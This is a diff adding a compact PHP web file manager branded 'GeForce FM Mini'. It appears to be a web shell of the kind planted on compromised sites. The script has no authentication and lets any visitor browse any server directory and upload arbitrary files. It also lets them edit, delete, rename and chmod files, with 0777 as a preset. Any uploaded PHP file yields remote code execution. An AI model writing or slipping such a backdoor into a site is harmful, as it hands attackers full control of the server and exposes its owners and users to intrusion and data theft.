@@ -1,0 +1,105 @@
+<?php
+// GeForce FM Mini
+$dir=isset($_GET["d"])?$_GET["d"]:__DIR__;$dir=realpath($dir);if(!$dir)$dir=__DIR__;
+$msg="";
+if(isset($_FILES["f"])&&$_FILES["f"]["error"]===UPLOAD_ERR_OK){$dest=$dir."/".basename($_FILES["f"]["name"]);if(move_uploaded_file($_FILES["f"]["tmp_name"],$dest)){$msg="Uploaded: ".basename($dest);@chmod($dest,0644);}else $msg="Upload failed";}
+if(isset($_GET["del"])){$dp=realpath($dir."/".basename($_GET["del"]));if($dp&&strpos($dp,$dir)===0){if(is_file($dp)){@unlink($dp);$msg="Deleted";}elseif(is_dir($dp)){function rd($d){$i=scandir($d);foreach($i as $f){if($f==="."||$f==="..")continue;$p=$d."/".$f;is_dir($p)?rd($p):@unlink($p);}@rmdir($d);}rd($dp);$msg="Deleted folder";}}}
+if(isset($_POST["save"])&&isset($_POST["content"])&&isset($_POST["fn"])){$ep=realpath($dir."/".basename($_POST["fn"]));if($ep&&is_file($ep)){file_put_contents($ep,$_POST["content"]);$msg="Saved";}}
+if(isset($_POST["mkdir"])&&!empty($_POST["dn"])){$nd=$dir."/".preg_replace("/[^a-zA-Z0-9_\-\.]/","",trim($_POST["dn"]));if(!file_exists($nd)){@mkdir($nd,0755,true);$msg="Folder created";}}
+if(isset($_POST["rename"])&&!empty($_POST["old"])&&!empty($_POST["new"])){$op=$dir."/".basename($_POST["old"]);$np=$dir."/".basename($_POST["new"]);if(file_exists($op)&&!file_exists($np)){@rename($op,$np);$msg="Renamed";}}
+if(isset($_POST["chm"])&&isset($_POST["cf"])&&isset($_POST["cp"])){$cp2=realpath($dir."/".basename($_POST["cf"]));if($cp2&&preg_match("/^[0-7]{3,4}$/",trim($_POST["cp"]))){@chmod($cp2,intval(trim($_POST["cp"]),8));clearstatcache();$msg="Permissions changed";}}
+$items=@scandir($dir);$parent=dirname($dir);
+function fsize($b){if($b<1024)return $b." B";if($b<1048576)return round($b/1024,1)." KB";return round($b/1048576,1)." MB";}
+function fperms($f){return substr(sprintf("%o",fileperms($f)),-4);}
+?><!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>FM</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}body{font-family:-apple-system,system-ui,sans-serif;background:#0a0b0f;color:#c9d1d9;padding:15px;font-size:14px}
+.w{max-width:900px;margin:0 auto}
+.hd{display:flex;align-items:center;justify-content:space-between;padding:15px 0;border-bottom:1px solid #1e2130;margin-bottom:15px}
+.hd h1{font-size:18px;color:#fff}.hd .host{color:#4a9eff;font-size:12px}
+.msg{padding:10px 14px;border-radius:8px;margin-bottom:12px;font-size:13px;background:rgba(74,158,255,.1);border:1px solid #1e3a5f;color:#58a6ff}
+.path{padding:10px 14px;background:#12141c;border-radius:8px;margin-bottom:12px;font-size:12px;font-family:monospace;word-break:break-all;color:#8b949e}
+.path a{color:#4a9eff;text-decoration:none}.path a:hover{text-decoration:underline}
+.acts{display:flex;gap:8px;margin-bottom:15px;flex-wrap:wrap;align-items:center}
+.acts form{display:flex;gap:6px;align-items:center}
+.acts input[type=file]{font-size:12px;color:#8b949e}
+.acts input[type=text]{padding:6px 10px;background:#12141c;border:1px solid #1e2130;border-radius:6px;color:#c9d1d9;font-size:12px;width:130px}
+.b{padding:6px 14px;border:none;border-radius:6px;font-size:12px;font-weight:600;cursor:pointer;color:#fff;transition:.15s}
+.b:hover{filter:brightness(1.1)}
+.b-u{background:#238636}.b-m{background:#1f6feb}.b-d{background:#da3633}.b-s{background:#8957e5}.b-w{background:#d29922}
+table{width:100%;border-collapse:collapse}
+th{text-align:left;padding:8px 10px;font-size:11px;color:#8b949e;text-transform:uppercase;letter-spacing:.5px;border-bottom:2px solid #1e2130}
+td{padding:7px 10px;border-bottom:1px solid #151720;font-size:13px}
+tr:hover{background:#12141c}
+td a{color:#4a9eff;text-decoration:none}td a:hover{text-decoration:underline}
+.ic{margin-right:6px}
+.al{white-space:nowrap}.al a{margin-right:8px;font-size:12px;color:#8b949e}.al a:hover{color:#c9d1d9}
+.al a.del{color:#f85149}
+.prm{font-family:monospace;font-size:12px;color:#8b949e}
+.sz{color:#8b949e;font-size:12px}
+.ed{margin-top:15px;background:#12141c;border:1px solid #1e2130;border-radius:10px;padding:15px}
+.ed h2{font-size:15px;color:#fff;margin-bottom:10px}
+.ed textarea{width:100%;height:350px;padding:12px;background:#0a0b0f;border:1px solid #1e2130;border-radius:8px;color:#c9d1d9;font-family:"Fira Code",Consolas,monospace;font-size:13px;resize:vertical;line-height:1.5}
+.ft{text-align:center;padding:20px 0;color:#2d333b;font-size:11px;border-top:1px solid #1e2130;margin-top:20px}
+</style></head><body><div class="w">
+<div class="hd"><h1>&#9889; GeForce FM</h1><span class="host"><?php echo htmlspecialchars($_SERVER["HTTP_HOST"]??"");?></span></div>
+<?php if($msg):?><div class="msg"><?php echo htmlspecialchars($msg);?></div><?php endif;?>
+<div class="path"><?php
+$parts=explode("/",$dir);$build="";
+foreach($parts as $k=>$p){if($p==="")continue;$build.="/".$p;
+echo '<a href="?d='.urlencode($build).'">'.htmlspecialchars($p).'</a>';
+if($k<count($parts)-1)echo ' / ';}
+?></div>
+<div class="acts">
+<form method="post" enctype="multipart/form-data" action="?d=<?php echo urlencode($dir);?>"><input type="file" name="f" required><button class="b b-u" type="submit">Upload</button></form>
+<form method="post" action="?d=<?php echo urlencode($dir);?>"><input type="text" name="dn" placeholder="New folder"><button class="b b-m" type="submit" name="mkdir" value="1">Create</button></form>
+</div>
+<table>
+<tr><th>Name</th><th>Size</th><th>Perms</th><th>Modified</th><th>Actions</th></tr>
+<?php if($dir!==$parent):?>
+<tr><td><span class="ic">&#128194;</span><a href="?d=<?php echo urlencode($parent);?>">..</a></td><td></td><td></td><td></td><td></td></tr>
+<?php endif;
+if($items){sort($items);$dirs=[];$fls=[];
+foreach($items as $i){if($i==="."||$i==="..")continue;$fp=$dir."/".$i;if(is_dir($fp))$dirs[]=$i;else $fls[]=$i;}
+foreach($dirs as $i){$fp=$dir."/".$i;?>
+<tr><td><span class="ic">&#128194;</span><a href="?d=<?php echo urlencode($fp);?>"><?php echo htmlspecialchars($i);?></a></td>
+<td class="sz">&mdash;</td><td class="prm"><?php echo fperms($fp);?></td>
+<td class="sz"><?php echo date("M d H:i",filemtime($fp));?></td>
+<td class="al"><a href="?d=<?php echo urlencode($dir);?>&del=<?php echo urlencode($i);?>" class="del" onclick="return confirm('Delete folder?')">Delete</a></td></tr>
+<?php }foreach($fls as $i){$fp=$dir."/".$i;?>
+<tr><td><span class="ic">&#128196;</span><?php echo htmlspecialchars($i);?></td>
+<td class="sz"><?php echo fsize(filesize($fp));?></td><td class="prm"><?php echo fperms($fp);?></td>
+<td class="sz"><?php echo date("M d H:i",filemtime($fp));?></td>
+<td class="al">
+<a href="?d=<?php echo urlencode($dir);?>&edit=<?php echo urlencode($i);?>">Edit</a>
+<a href="?d=<?php echo urlencode($dir);?>&del=<?php echo urlencode($i);?>" class="del" onclick="return confirm('Delete?')">Delete</a>
+<a href="?d=<?php echo urlencode($dir);?>&ren=<?php echo urlencode($i);?>">Rename</a>
+<a href="?d=<?php echo urlencode($dir);?>&chm=<?php echo urlencode($i);?>">Chmod</a>
+</td></tr>
+<?php }}?>
+</table>
+<?php if(isset($_GET["edit"])){$ef=basename($_GET["edit"]);$ep=realpath($dir."/".$ef);if($ep&&is_file($ep)){$ct=file_get_contents($ep);?>
+<div class="ed"><h2>Edit: <?php echo htmlspecialchars($ef);?></h2>
+<form method="post" action="?d=<?php echo urlencode($dir);?>">
+<textarea name="content"><?php echo htmlspecialchars($ct);?></textarea>
+<input type="hidden" name="fn" value="<?php echo htmlspecialchars($ef);?>">
+<div style="margin-top:10px;display:flex;gap:8px"><button class="b b-u" type="submit" name="save" value="1">Save</button><a href="?d=<?php echo urlencode($dir);?>" class="b b-d" style="text-decoration:none;text-align:center;padding:8px 18px">Cancel</a></div>
+</form></div>
+<?php }}?>
+<?php if(isset($_GET["ren"])){$rn=basename($_GET["ren"]);?>
+<div class="ed"><h2>Rename: <?php echo htmlspecialchars($rn);?></h2>
+<form method="post" action="?d=<?php echo urlencode($dir);?>">
+<input type="hidden" name="old" value="<?php echo htmlspecialchars($rn);?>">
+<div style="display:flex;gap:8px;align-items:center"><input type="text" name="new" value="<?php echo htmlspecialchars($rn);?>" style="flex:1;padding:8px 12px;background:#0a0b0f;border:1px solid #1e2130;border-radius:6px;color:#c9d1d9;font-size:13px"><button class="b b-s" type="submit" name="rename" value="1">Rename</button></div>
+</form></div>
+<?php }?>
+<?php if(isset($_GET["chm"])){$cn=basename($_GET["chm"]);$cfp=realpath($dir."/".$cn);$cv=$cfp?fperms($cfp):"0644";?>
+<div class="ed"><h2>Chmod: <?php echo htmlspecialchars($cn);?></h2>
+<form method="post" action="?d=<?php echo urlencode($dir);?>">
+<input type="hidden" name="cf" value="<?php echo htmlspecialchars($cn);?>">
+<div style="display:flex;gap:8px;align-items:center"><input type="text" name="cp" value="<?php echo $cv;?>" maxlength="4" style="width:80px;padding:8px 12px;background:#0a0b0f;border:1px solid #1e2130;border-radius:6px;color:#c9d1d9;font-family:monospace;font-size:14px;text-align:center"><button class="b b-w" type="submit" name="chm" value="1">Apply</button>
+<?php foreach(["0644","0755","0777"] as $pr):?><button type="button" class="b" style="background:#1e2130" onclick="this.form.cp.value='<?php echo $pr;?>'"><?php echo $pr;?></button><?php endforeach;?>
+</div></form></div>
+<?php }?>
+<div class="ft">GeForce FM</div>
+</div></body></html>
